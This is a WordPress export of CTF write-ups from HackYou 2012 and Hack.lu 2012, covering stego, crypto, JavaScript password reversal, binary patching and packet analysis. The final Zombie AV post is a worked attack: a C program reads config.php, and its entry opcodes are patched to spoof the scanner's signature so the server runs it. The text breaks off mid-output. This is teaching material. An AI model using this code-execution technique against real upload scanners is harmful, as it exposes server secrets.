amon@Alyx:~/hackyou/stg200$ compare nstg200.png stg200.png compare.png -compose Src -highlight-color White -lowlight-color Black compare2.png
[/shell]

The compare command generates a third image amplifying the difference between the two source images.

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/compare2.png"><img class="alignnone size-large wp-image-55" title="compare2" src="http://nandynarwhals.org/wp-content/uploads/2012/10/compare2-1024x640.png" alt="" width="584" height="365" /></a>

The secret key appears to be in some form of encryption or encoding: symbols (: and .) grouped in sets of seven. We took these symbols to represent binary (: for 1 and . for 0) and placed them in a file (secret).

[text]
1100001 1101001 1101110 1110100 1011111 1100001 1100110 1110010
1100001 1101001 1100100 1011111 1101111 1100110 1011111 1101110
1101111 1011111 1100111 1101000 1101111 1110011 1110100 1110011
[/text]

Then we wrote a simple python script (solve_stg200.py) to convert these bit strings to bytes and then to ASCII characters:

[python]
secrets = file("secret").read().split()
print "".join(chr(int(i, 2)) for i in secrets)
[/python]

The script in action:

[shell]
amon@Alyx:~/hackyou/stg200$ python solve_stg200.py
aint_afraid_of_no_ghosts
amon@Alyx:~/hackyou/stg200$
[/shell]

We also did some other tests on the original image. Adjusting the colours in GIMP by playing around with levels a bit and saving a more red rich image and performing the above process again also yielded the same result.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>52</wp:post_id>
		<wp:post_date>2012-10-19 01:11:01</wp:post_date>
		<wp:post_date_gmt>2012-10-18 17:11:01</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-you-2012-halloween-stg200</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack You 2012 – Schneier&#039;s Algorithm (CRY100)</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-schneiers-algorithm-cry200/</link>
		<pubDate>Fri, 19 Oct 2012 01:28:39 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=61</guid>
		<description></description>
		<content:encoded><![CDATA[We didn't solve this puzzle and submit the flag in time, but when we did... well it was a huge reminder not to overthink things.

We were given this image:

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/cry100.jpg"><img src="http://nandynarwhals.org/wp-content/uploads/2012/10/cry100.jpg" alt="" title="cry100" width="659" height="750" class="alignnone size-full wp-image-62" /></a>

Of course, we assumed the organisers were giving us a clue with the arrow pointing at the word 'Schneier' and we tried multiple transposition and substitution ciphers with that key.

However, the key was to simply read it from the top right corner down to the left.

[text]
TTHOH
FEEUA
FSBIC
TTESK
WCSTY
[/text]

So the flag was: HACKYOUISTHEBESTESTCTFFTW.

Damn it lol.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>61</wp:post_id>
		<wp:post_date>2012-10-19 09:28:39</wp:post_date>
		<wp:post_date_gmt>2012-10-19 01:28:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-you-2012-schneiers-algorithm-cry200</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack You 2012 – Pentagon (WEB100)</title>
		<link>http://nandynarwhals.org/2012/10/19/66/</link>
		<pubDate>Fri, 19 Oct 2012 02:19:32 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=66</guid>
		<description></description>
		<content:encoded><![CDATA[To solve the puzzle, we had to obtain the password to a 'Pentagon' site relying on Javascript authentication.

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-092949.png"><img class="alignnone size-large wp-image-67" title="Screenshot at 2012-10-19 09:29:49" src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-092949-1024x575.png" alt="" width="584" height="327" /></a>

The source file may be downloaded here: <a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Pentagon-Data-Storage-Authentication.html">Pentagon Data Storage Authentication</a>.

Examining the code, we are given a set of clues and conditions to the password's contents.

These conditions have to be fulfilled, to summarise:<!--more-->
<ol>
	<li>Password is not empty</li>
	<li>Password is length 12</li>
	<li>Password[0] is a number</li>
	<li>Password[1] and Password[10] are numbers</li>
	<li>Password[2] and Password[6] are numbers</li>
	<li>Password[0] + Password[1] + Password[2] + Password[6] + Password[10] must equal to 12</li>
	<li>Password[7] must equal to PasswordPrompt[len(PasswordPrompt)-1] (which is 'd')</li>
	<li>ord(Password[7]) must equal ord(Password[8]) - Password[0] / Password[0]</li>
	<li>Password[2] must equal Password[6] and Password[6] must equal Password[1]</li>
	<li>Password[1] * Password[10] must equal 0</li>
	<li>Password[1] - Password[10] must equal to len(Password[3]) (which is 1)</li>
	<li>Password[11] + Password[3] + Password[4] must be lexigraphically equal to TodaysSecretPassphrase.substr(Number(SuppliedPassword.charAt(0)) / 2, 3)</li>
	<li>Password[9] has to be lower case</li>
	<li>Password[9] has to not be found in the QuoteOfTheDay</li>
</ol>
Going through the steps:

<strong>1. Password is not empty</strong>

[javascript]
if (SuppliedPassword === null) {
break;
}
[/javascript]

Password: ""

<strong>2. Password is length 12</strong>

[javascript]
if (SuppliedPassword.length == 12) {
PasswordIsCorrect = true;
}
[/javascript]

<code>Password: "AAAAAAAAAAAA"</code>

<strong>3. Password[0] is a number</strong>

[javascript]
if (! IsNumber(SuppliedPassword.charAt(0))) {
PasswordIsCorrect = false;
}
[/javascript]

<code>Password: "$AAAAAAAAAAA"</code>

<strong>4. Password[1] and Password[10] are numbers</strong>

[javascript]
if (! IsNumber(SuppliedPassword.charAt(10)) || ! IsNumber(SuppliedPassword.charAt(1))) {
PasswordIsCorrect = false;
}
[/javascript]

<code>Password: "$$AAAAAAAA$A"</code>

<strong>5. Password[2] and Password[6] are numbers</strong>

[javascript]
if (! IsNumber(SuppliedPassword.charAt(6)) || ! IsNumber(SuppliedPassword.charAt(2))) {
PasswordIsCorrect = false;
}
[/javascript]

<code>Password: "$$$AAA$AAA$A"</code>

<strong>6. Password[0] + Password[1] + Password[2] + Password[6] + Password[10] must equal to 12</strong>

[javascript]
if (Number(SuppliedPassword.charAt(0)) + Number(SuppliedPassword.charAt(1)) + Number(SuppliedPassword.charAt(2)) + Number(SuppliedPassword.charAt(6)) + Number(SuppliedPassword.charAt(10)) != SuppliedPassword.length) {
PasswordIsCorrect = false;
}
[/javascript]

<code>Password: "$$$AAA$AAA$A" (where all $ == 12)</code>

<strong>7. Password[7] must equal to PasswordPrompt[len(PasswordPrompt)-1] (which is 'd')</strong>

[javascript]
if (SuppliedPassword.charAt(7) != PasswordPrompt.charAt(PasswordPrompt.length - 1)) {
PasswordIsCorrect = false;
}
[/javascript]

<code>Password: "$$$AAA$dAA$A"</code>

<strong>8. ord(Password[7]) must equal ord(Password[8]) - Password[0] / Password[0]</strong>

[javascript]
if (SuppliedPassword.charCodeAt(7) != SuppliedPassword.charCodeAt(8) - Number(SuppliedPassword.charAt(0)) / Number(SuppliedPassword.charAt(0))) {
PasswordIsCorrect = false;
}
[/javascript]

Since a/a = 1, the char code at 7 must be one less than the char code at 8. This Password[8] has to be 'e'.

<code>Password: "$$$AAA$deA$A"</code>

<strong>9. Password[2] must equal Password[6] and Password[6] must equal Password[1]</strong>

[javascript]
if (Number(SuppliedPassword.charAt(2)) != Number(SuppliedPassword.charAt(6)) || Number(SuppliedPassword.charAt(6)) != Number(SuppliedPassword.charAt(1))) {
PasswordIsCorrect = false;
}
[/javascript]

<code>Password: "$&amp;&amp;AAA&amp;deA$A"</code>

<strong>10. Password[1] * Password[10] must equal 0</strong>

[javascript]
if (Number(SuppliedPassword.charAt(1)) * Number(SuppliedPassword.charAt(10)) != 0) {
PasswordIsCorrect = false;
}
[/javascript]

This condition means that either Password[0] or Password[10] is 0.

<code>Password: "$&amp;&amp;AAA&amp;deA$A"</code>

<strong>11. Password[1] - Password[10] must equal to len(Password[3]) (which is 1)</strong>

[javascript]
if (Number(SuppliedPassword.charAt(1)) - Number(SuppliedPassword.charAt(10)) != SuppliedPassword.charAt(3).length) {
PasswordIsCorrect = false;
}
[/javascript]

With this condition, we may deduce four things:
a) Password[10] is 0, because of Condition 10.
b) Password[1] is 1, because it follows from the next logical conclusion we can make if a) is true, then Password[1] = Password[10] + 1.
c) Password[2] and Password[6] is 1, because of Condition 9.
d) Password[0] is 9, because of Condition 6.

<code>Password: "911AAA1deA0A"</code>

<strong>12. Password[11] + Password[3] + Password[4] must be lexigraphically equal to TodaysSecretPassphrase.substr(Number(SuppliedPassword.charAt(0)) / 2, 3)</strong>

[javascript]
if (SuppliedPassword.charAt(11) + SuppliedPassword.charAt(3) + SuppliedPassword.charAt(4) != TodaysSecretPassphrase.substr(Number(SuppliedPassword.charAt(0)) / 2, 3)) {
PasswordIsCorrect = false;
}
[/javascript]

With our information so far, the substring that the concatenation of letter must match is "bin". Hence,

<code>Password: "911inA1deA0b"</code>

<strong>13. Password[9] has to be lower case</strong>

[javascript]
if (! IsLowercase(SuppliedPassword.charAt(9))) {
PasswordIsCorrect = false;
}
[/javascript]

<code>Password: "911inA1dea0b"</code>

<strong>14. Password[9] has to not be found in the QuoteOfTheDay</strong>

[javascript]
if (QuoteOfTheDay.indexOf(SuppliedPassword.charAt(9)) != -1) {
PasswordIsCorrect = false;
}
[/javascript]

The only letter missing from the quote is 'j'.

<code>Password: "911inA1dej0b"</code>

<strong>15. The missing character</strong>

<strong></strong>The only unknown character in the password is in index 5. However, this character is not checked nor is it used in the generation of the secret. It is probably 's' however, in keeping with the theme of the challenge.

<code>Password: "911ins1dej0b"</code>

Entering this as the password, will yield a page that displays the flag and then destroys it by overwriting it.

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-093018.png"><img class="alignnone size-large wp-image-68" title="Screenshot at 2012-10-19 09:30:18" src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-093018-1024x575.png" alt="" width="584" height="327" /></a>

And after it erases the flag:

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-093029.png"><img class="alignnone size-large wp-image-69" title="Screenshot at 2012-10-19 09:30:29" src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-093029-1024x575.png" alt="" width="584" height="327" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>66</wp:post_id>
		<wp:post_date>2012-10-19 10:19:32</wp:post_date>
		<wp:post_date_gmt>2012-10-19 02:19:32</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>66</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack You 2012 – Reverse 100 (REV100)</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-reverse-100-rev100/</link>
		<pubDate>Fri, 19 Oct 2012 10:48:57 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=89</guid>
		<description></description>
		<content:encoded><![CDATA[In this puzzle, a C source file was given to us.

[c]
#include
#include

int main(int argc, char *argv[]) {
if (argc != 4) {
printf("what?\n");
exit(1);
}

unsigned int first = atoi(argv[1]);
if (first != 0xcafe) {
printf("you are wrong, sorry.\n");
exit(2);
}

unsigned int second = atoi(argv[2]);
if (second % 5 == 3 || second % 17 != 8) {
printf("ha, you won't get it!\n");
exit(3);
}

if (strcmp("h4cky0u", argv[3])) {
printf("so close, dude!\n");
exit(4);
}

printf("Brr wrrr grr\n");

unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;

printf("Get your key: ");
printf("%x\n", hash);
return 0;
}
[/c]

The objective is to place the proper arguments when executing the program in order to obtain the answer.<!--more-->

[c]
if (argc != 4) {
printf("what?\n");
exit(1);
}
[/c]

The program takes three arguments on the command line.

[c]
unsigned int first = atoi(argv[1]);
if (first != 0xcafe) {
printf("you are wrong, sorry.\n");
exit(2);
}
[/c]

The first argument is converted to an unsigned integer. It has to match the constant hexadecimal value of 0xcafe or 51966 in decimal.

[c]
unsigned int second = atoi(argv[2]);
if (second % 5 == 3 || second % 17 != 8) {
printf("ha, you won't get it!\n");
exit(3);
}
[/c]

The second argument is also converted to an unsigned integer. This argument has to not yield 3 when mod with 5 and yield 8 when mod with 17.

The first number that matches the second condition is 17 + 8 = 25.

This number also passes the first condition, 25 mod 5 is 0 not 3.

[c]
if (strcmp("h4cky0u", argv[3])) {
printf("so close, dude!\n");
exit(4);
}
[/c]

The third argument is simply "h4cky0u". It is validated by a simple string compare.

The result of executing the program with the discovered arguments:

[shell]
amon@Alyx:~/hackyou/rev100$ ./code 51966 25 h4cky0u
Brr wrrr grr
Get your key: c0ffee
amon@Alyx:~/hackyou/rev100$
[/shell]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>89</wp:post_id>
		<wp:post_date>2012-10-19 18:48:57</wp:post_date>
		<wp:post_date_gmt>2012-10-19 10:48:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-you-2012-reverse-100-rev100</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack You 2012 – Reverse 200 (REV200)</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-reverse-200-rev200/</link>
		<pubDate>Fri, 19 Oct 2012 11:31:08 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=91</guid>
		<description></description>
		<content:encoded><![CDATA[A zip file containing an ELF binary and Windows executable file was given to us. We need not care about the Windows executable as both the ELF binary and the Windows executable do the same things.

You can download the original zip file here: <a href="http://nandynarwhals.org/wp-content/uploads/2012/10/rev200.zip">rev200</a>.

We run the program for the first time:

[shell]
amon@Alyx:~/hackyou/rev200$ ./task2.bin
Welcome to the LoseYou lottery!
Generating random.....
Make your guess (number 0 or 1): 0
Fail... The number was 882298492
Try again.
Err, you shouldn't
amon@Alyx:~/hackyou/rev200$
[/shell]

Now run it through strace (here's an extract):<!--more-->

[shell]
write(1, "Welcome to the LoseYou lottery!\n", 32Welcome to the LoseYou lottery!
) = 32
write(1, "Generating random", 17Generating random) = 17
nanosleep({1, 0}, 0xffd70fc4) = 0
write(1, ".", 1.) = 1
... more nanosleeps and write('.')s ...
write(1, "\n", 1) = 1
time(NULL) = 1350644435
write(1, "Make your guess (number 0 or 1):"..., 33Make your guess (number 0 or 1): ) = 33
read(0, 31337"31337\n", 1024) = 6
write(1, "Fail... The number was -65336549"..., 45Fail... The number was -653365492
Try again.
) = 45
nanosleep({2, 0}, 0xffd70fc4) = 0
write(1, "Err, you shouldn't\n", 19Err, you shouldn't) = 19
nanosleep({3, 0}, 0xffd70fc4) = 0
exit_group(0) = ?
[/shell]

The number is based on time(NULL), probably an srand around somewhere too. We could reverse the number generation algorithm, or we could just find out how the input test is done. First we made an objdump disassembly. After poking around in GDB, we discover the function calls not determined by static analysis.

[text]
80484d1: e8 aa 04 00 00 call 8048980 ; fgets()
80484d6: 83 c4 0c add $0xc,%esp
80484d9: 0f be 45 ee movsbl -0x12(%ebp),%eax
80484dd: 83 f8 31 cmp $0x31,%eax
80484e0: 0f 85 05 00 00 00 jne 80484eb
80484e6: e9 0a 00 00 00 jmp 80484f5
80484eb: b8 00 00 00 00 mov $0x0,%eax
80484f0: e9 05 00 00 00 jmp 80484fa
80484f5: b8 01 00 00 00 mov $0x1,%eax
80484fa: 89 45 e8 mov %eax,-0x18(%ebp)
80484fd: 8b 45 e8 mov -0x18(%ebp),%eax
8048500: 8b 4d f4 mov -0xc(%ebp),%ecx
8048503: 39 c8 cmp %ecx,%eax
[/text]

We can see that %eax contains the user input and %ecx contains some validation value of some kind: the number. This can be verified by simply changing the register value in GDB.

[shell]
(gdb) info reg
eax 0x0 0
ecx 0x215c6841 559704129
edx 0xf7fb63a4 -134519900
ebx 0xf7fb4ff4 -134524940
esp 0xffffd7a4 0xffffd7a4
ebp 0xffffd7e8 0xffffd7e8
esi 0x0 0
edi 0x0 0
eip 0x8048503 0x8048503
eflags 0x202 [ IF ]
cs 0x23 35
ss 0x2b 43
ds 0x2b 43
es 0x2b 43
fs 0x0 0
gs 0x63 99
(gdb) set $eax = 0x215c6841
(gdb) c
Continuing.
You... you... win??? so lucky! Grab the flag:
::: oh_you_cheat3r :::
[Inferior 1 (process 7760) exited normally]
(gdb)
[/shell]

However, we want a more persistent way of obtaining the flag (for the fun of it) so we modify a few opcodes. Namely, at the following two locations:

[text]
804843a: e8 01 05 00 00 call 8048940 ; sleep
8048503: 39 c8 cmp %ecx,%eax
[/text]

We just patch the call to sleep with NOP bytes (0x90), and the cmp to test %ecx with %ecx so the conditional will always run true.

Running this patched binary:

[text]
amon@Alyx:~/hackyou/rev200$ echo "" | ./task2.patched.bin
Welcome to the LoseYou lottery!
Generating random.....
Make your guess (number 0 or 1): You... you... win??? so lucky! Grab the flag:
::: oh_you_cheat3r :::
amon@Alyx:~/hackyou/rev200$
[/text]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>91</wp:post_id>
		<wp:post_date>2012-10-19 19:31:08</wp:post_date>
		<wp:post_date_gmt>2012-10-19 11:31:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-you-2012-reverse-200-rev200</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack You 2012 – Packets 100 (PAC100)</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-packets-100-pac100/</link>
		<pubDate>Fri, 19 Oct 2012 11:47:04 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=101</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-194411.png"><img src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-194411-1024x575.png" alt="" title="Screenshot at 2012-10-19 19:44:11" width="584" height="327" class="alignnone size-large wp-image-107" /></a>

We are given an objective for the packets series: "Part 1. Find the secret link in this conversation." We have a .pcap capture file and we simply apply a filter to the captures. 

[text]
filter: "data-text-lines contains "key"
message=oh%2C%20sry.%20key%20is%20tinyurl.com%2F8pdox5a&to=%23hacku
[/text]

Decoding the url encoded string yields the message: "oh, sry. key is tinyurl.com/8pdox5a".

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>101</wp:post_id>
		<wp:post_date>2012-10-19 19:47:04</wp:post_date>
		<wp:post_date_gmt>2012-10-19 11:47:04</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-you-2012-packets-100-pac100</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack You 2012 – Packets 200 (PAC200)</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-packets-200-pac200/</link>
		<pubDate>Fri, 19 Oct 2012 11:55:00 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=109</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-195037.png"><img src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-19-195037-1024x575.png" alt="" title="Screenshot at 2012-10-19 19:50:37" width="584" height="327" class="alignnone size-large wp-image-110" /></a>

In this task, we are supposed to answer the question: "What's the md5 of the file being transferred?". We are given another capture file, this time containing a session with FTP.

We simply followed the tcp stream of the FTP data transferred after a RETR command was sent to the server and saved the data to a file.

After that, we ran md5sum on the file.

[shell]
amon@Alyx:~/hackyou/pac200$ md5sum ftpdata 
77f92edb199815b17e2ff8da36e200df  ftpdata
amon@Alyx:~/hackyou/pac200$
[/shell]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>109</wp:post_id>
		<wp:post_date>2012-10-19 19:55:00</wp:post_date>
		<wp:post_date_gmt>2012-10-19 11:55:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-you-2012-packets-200-pac200</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>HackYou CTF 2012 - Write-ups</title>
		<link>http://nandynarwhals.org/2012/10/19/hackyou-ctf-2012-write-ups/</link>
		<pubDate>Fri, 19 Oct 2012 12:40:13 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=112</guid>
		<description></description>
		<content:encoded><![CDATA[The CTF was really enjoyable. Really great casual atmosphere to it. Too bad we only really caught the last couple of days. Really looking forward to the next one.

Here is a list of write-ups we have published:

<strong>Programming</strong>
<a href="http://nandynarwhals.org/2012/10/18/hack-you-ctf-2012-ppc100/">PPC100</a>

<strong>Steganography</strong>
<a href="http://nandynarwhals.org/2012/10/19/hack-you-2012-stego-100-stg100/">STG100</a>
<a href="http://nandynarwhals.org/2012/10/19/hack-you-2012-halloween-stg200/">STG200</a>

<strong>Cryptography</strong>
<a href="http://nandynarwhals.org/2012/10/19/hack-you-2012-schneiers-algorithm-cry200/">CRY100</a>

<strong>Web</strong>
<a href="http://nandynarwhals.org/2012/10/19/66/">WEB100</a>

<strong>Reversing</strong>
<a href="http://nandynarwhals.org/2012/10/19/hack-you-2012-reverse-100-rev100/">REV100</a>
<a href="http://nandynarwhals.org/2012/10/19/hack-you-2012-reverse-200-rev200/">REV200</a>

<strong>Packets</strong>
<a href="http://nandynarwhals.org/2012/10/19/hack-you-2012-packets-100-pac100/">PAC100</a>
<a href="http://nandynarwhals.org/2012/10/19/hack-you-2012-packets-200-pac200/">PAC200</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>112</wp:post_id>
		<wp:post_date>2012-10-19 20:40:13</wp:post_date>
		<wp:post_date_gmt>2012-10-19 12:40:13</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hackyou-ctf-2012-write-ups</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack.lu CTF 2012 Zombie AV</title>
		<link>http://nandynarwhals.org/2012/10/25/hack-lu-ctf-zombie-av/</link>
		<pubDate>Thu, 25 Oct 2012 12:15:18 +0000</pubDate>
		<dc:creator>admin</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=117</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>Some people try to fight the zombie apocalypse by selling pseudo antidote. We need the secret formula in config.php to destroy their snake oil business...

Source: http://dl.ctftime.org/38/119/zombieav.zip

Page: https://ctf.fluxfingers.net:2070</blockquote>
Basically we just want to read the config.php file for the $secret.<!--more-->

From the sample config.php in the zip file:
[php]
&lt;?php

$readelfpath='/usr/bin/readelf';
$objdumppath='/usr/bin/objdump';
$uploadpath='upload/';
$scriptpath='/var/www/';
$secret='______________________';

?&gt;
[/php]

Uploading any random binary shows us this:

[text]

analysing file 3fe6e0634a9977050ac1f9d67e4edc59
8048330: 31 ed xor %ebp,%ebp
8048332: 5e pop %esi
8048333: 89 e1 mov %esp,%ecx
8048335: 83 e4 f0 and $0xfffffff0,%esp
8048338: 50 push %eax
8048339: 54 push %esp
804833a: 52 push %edx
804833b: 68 b0 84 04 08 push $0x80484b0
8048340: 68 50 84 04 08 push $0x8048450
8048345: 51 push %ecx
8048346: 56 push %esi
8048347: 68 04 84 04 08 push $0x8048404
804834c: e8 bf ff ff ff call 8048310 &lt;__libc_start_main@plt&gt;
8048351: f4 hlt
8048352: 90 nop
8048353: 90 nop
8048354: 55 push %ebp
80483
Entry Opcodes are: 31 ed 5e 89 e1 83 e4 f0 50 54 52 68
Signature is: d87ae7dd8b166d8e2c02676d69561c96
no zombie virus found

[/text]

No luck, its not the binary they're looking for. Taking a look at scan.php which does the scanning, we see:

[php]

$opcodes=getOpcodes($rest);
print "Entry Opcodes are: ".$opcodes;
print "\n";
print "Signature is: " . md5($opcodes);
print "\n";

[/php]

So we see that getOpcodes() extracts exactly "31 ed 5e 89 e1 83 e4 f0 50 54 52 68" this much of hex from the binary. And scan.php does the matching by md5($opcodes) === 'cd53b957ec552afb39cba6daed7a9abc'. All we need to do is get scan.php to read the correct $opcodes that generates the desired md5sum.

There is a huge hint in the php file that tells us what opcodes generates the desired md5sum.

[text]

/*
* hint: zombie virus signature is
* 8048340: b0 01 mov $0x1,%al
* 8048342: 90 nop
* 8048343: 90 nop
* 8048344: 90 nop
* 8048345: 90 nop
* 8048346: 90 nop
* 8048347: 90 nop
* 8048348: 90 nop
* 8048349: 90 nop
* 804834a: cd 80 int $0x80
*/

[/text]

After passing the md5sum comparison check, scan.php executes the uploaded binary and displays the output as shown in the source below. We can make use of this.

[php]

if (md5($opcodes) === 'cd53b957ec552afb39cba6daed7a9abc') {
print "found zombie virus, trying to execute it\n";
chmod($filename,755);

$handle = popen($filename.' 2&gt;&amp;1', 'r');

while (!feof($handle)) {
$read .= fread($handle, 8192);
}

pclose($handle);

print $read;
@unlink($filename);
print "done we are safe\n";
} else {
print "no zombie virus found";
}

}

[/php]

So we just need the uploaded binary to cat or read config.php and scan.php will automagically display the contents.

The following C code does just that.

[c]

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main( int argc, char *argv[]){
char *path[] = {"/bin/cat", "config.php", NULL};
execve("/bin/cat", path, NULL);

}

[/c]

Compile it.

[shell] gcc -m32 -o prepay.elf test.c [/shell]

After compiling, we just need to patch the binary, changing "31 ed 5e 89 e1 83 e4 f0 50 54 52 68" to "b0 01 90 90 90 90 90 90 90 90 cd 80". Fire up your hex editor, search for hex "31 ed" blah, change it to "b0 01" blah. Save and upload to Zombie AV.

[text]

analysing file 513160765dcc3d61a6cadd9c487ca00e
8048330: b0 01 mov $0x1,%al
8048332: 90 nop
8048333: 90 nop
